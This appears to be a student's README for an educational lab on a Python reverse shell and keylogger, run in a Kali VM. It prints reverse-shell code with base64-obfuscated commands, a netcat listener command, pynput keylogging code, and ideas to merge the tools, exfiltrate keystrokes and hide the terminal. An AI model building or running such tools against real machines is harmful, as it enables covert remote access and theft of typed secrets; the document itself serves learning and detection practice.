# reverse-shelling
Reverse Shell Simulation and Malware Analysis (Educational) 🔐

🧠 Educational Malware Simulation Lab
Created by Reeko Long | For ethical use only in isolated environments

🔹 What This Project Is
This is a controlled, educational simulation of basic malware behavior. It includes:

A Python reverse shell to simulate remote command access

A Python keylogger to simulate how attackers might capture keystrokes

Full understanding of how both tools work, how to build them, detect them, and defend against them

Run entirely inside a virtual Kali Linux lab for safety

🔹 Skills Gained
✅ Python scripting
✅ Linux CLI + networking
✅ TCP sockets & Netcat
✅ Base64 obfuscation
✅ Keylogging via pynput
✅ Virtual lab setup & security awareness
✅ Ethical hacking techniques
✅ Traffic monitoring using tcpdump
✅ Malware behavior detection

🔁 Reverse Shell (Attacker Gets Remote Access)
🧱 1. reverse_shell.py — What It Does
This script creates a backdoor that connects back to an attacker and lets them run terminal commands remotely.

Key lines:
python
Copy
Edit
import socket, subprocess
host = "127.0.0.1"
port = 4444
s = socket.socket()
s.connect((host, port))
What it means:

socket.socket() = make a virtual cable

connect() = call the attacker's computer (on IP 127.0.0.1 = localhost in this test)

Once connected, it waits for commands, runs them, and sends results back

Command loop:
python
Copy
Edit
command = s.recv(1024).decode()
output = subprocess.check_output(command, shell=True)
s.send(output)
What it does:

recv() waits for a command

subprocess.check_output() runs it like it was typed in a terminal

send() sends the output back to the attacker

🔒 Base64 Obfuscation
You upgraded it to:

python
Copy
Edit
import base64
encoded_command = s.recv(1024).decode()
command = base64.b64decode(encoded_command).decode()
Why?
To hide the command so it's not easily readable over the network.

Attacker now sends:

bash
Copy
Edit
echo -n "whoami" | base64
Which gives: d2hvYW1p
The victim script decodes it before running.

📡 Attacker Side: Using Netcat
In the attacker's terminal:

bash
Copy
Edit
nc -lvnp 4444
What it does:

nc = Netcat (network tool)

-l = listen

-v = verbose (show more info)

-n = don't do DNS lookup

-p 4444 = use port 4444

This listens for the victim to call back.

👀 Network Monitoring with tcpdump
In another terminal:

bash
Copy
Edit
sudo tcpdump -i lo port 4444 -A
Breakdown:

-i lo = watch the loopback interface (localhost)

port 4444 = only show traffic on that port

-A = print readable (ASCII) data

Used to analyze the communication between victim and attacker.

⌨️ Keylogger (keylogger.py)
🔐 What It Does
This script captures everything typed on the keyboard and saves it to a file.

Core code:
python
Copy
Edit
from pynput import keyboard
log_file = "keylog.txt"
pynput.keyboard = lets Python detect key presses

log_file = where all logs are saved

Capture logic:
python
Copy
Edit
def on_press(key):
    try:
        f.write(f"{key.char}")
    except:
        f.write(f"[{key}]")
key.char = regular letters

[key] = special keys like Enter, Ctrl, etc.

python
Copy
Edit
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
Listens for every keystroke until you stop it manually with CTRL + C

📁 Sample Output
Inside keylog.txt, you saw:

css
Copy
Edit
hgnfgbfgtrgrk[Key.enter][Key.enter]deactivate[Key.enter][Key.ctrl]c
That means you typed some gibberish, hit Enter a few times, typed deactivate, and stopped with Ctrl+C — all recorded accurately.

✅ How It Was Built and Tested
Kali Linux VM — safe isolated system

Wrote scripts using nano and VS Code

Ran Netcat listener, launched the shell, and executed commands

Sent base64-encoded payloads to simulate evasion

Ran the keylogger while typing and confirmed logs were created

Used tcpdump to monitor the exact communication flow

Ran everything in a virtual environment to avoid system damage

🔐 Responsible Use & Ethics
This project was built for:

Understanding attacker behavior

Practicing detection and mitigation

Learning Python + security tools

It was not run on any real machines or networks.

All testing was done in an isolated Kali VM, offline, for educational purposes only.

🗂️ Project Structure
bash
Copy
Edit
project/
├── reverse_shell.py         # Simulated malware that connects back to attacker
├── keylogger.py             # Captures keystrokes into keylog.txt
├── keylog.txt               # Output file with typed keys
├── screenshots/             # Visual proof of behavior
├── README.md                # Full explanation (this doc)
💬 Want to Expand It?
Combine reverse shell + keylogger into one payload

Send keylog.txt back to attacker using sockets

Add a GUI overlay (or hide the terminal)

Build a full "attacker simulator" platform for blue team training

